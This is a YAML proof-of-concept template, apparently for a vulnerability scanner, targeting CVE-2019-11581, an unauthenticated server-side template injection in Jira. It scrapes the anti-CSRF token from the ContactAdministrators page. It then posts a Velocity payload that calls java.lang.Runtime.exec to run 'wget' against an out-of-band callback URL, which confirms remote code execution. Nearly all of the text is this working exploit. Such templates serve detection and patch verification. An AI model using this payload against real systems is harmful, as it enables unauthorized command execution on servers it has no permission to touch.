id: CVE-2019-11581

info:
    name: Jira 未授权服务端模板注入
    author: harris2015(https://github.com/harris2015)
    severity: critical
    reference:
        - https://mp.weixin.qq.com/s/d2yvSyRZXpZrPcAkMqArsw

set:
    reverse: newReverse()
    reverseUrl: reverse.url
rules:
    r0:
        request:
            method: GET
            path: /secure/ContactAdministrators!default.jspa
        expression: response.status == 200
        output:
            search: '"name=\"atlassian-token\" content=\"(?P<token>.+?)\"".bsubmatch(response.body)'
            token: search["token"]
    r1:
        request:
            method: POST
            path: /secure/ContactAdministrators.jspa
            body: from=admin%40163.com&subject=%24i18n.getClass%28%29.forName%28%27java.lang.Runtime%27%29.getMethod%28%27getRuntime%27%2Cnull%29.invoke%28null%2Cnull%29.exec%28%27wget+{{reverseUrl}}+%27%29.waitFor%28%29&details=exange%20website%20links&atl_token={{token}}&%E5%8F%91%E9%80%81=%E5%8F%91%E9%80%81
        expression: response.status == 302 && reverse.wait(5)
expression: r0() && r1()

